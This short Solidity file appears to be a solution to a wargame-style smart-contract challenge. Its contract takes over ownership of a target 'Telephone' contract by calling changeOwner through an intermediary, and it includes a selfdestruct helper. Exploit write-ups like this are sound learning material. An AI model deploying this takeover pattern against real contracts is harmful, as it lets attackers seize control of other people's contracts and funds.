// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'interfaces/telephoneInterface.sol';

contract TelephoneAttack {
    TelephoneInterface telephone;

    constructor(address _address) public {
        telephone = TelephoneInterface(_address);
    }

    function hack() public {
        telephone.changeOwner(msg.sender);
    }

    function destroy() public {
        selfdestruct(msg.sender);
    }
}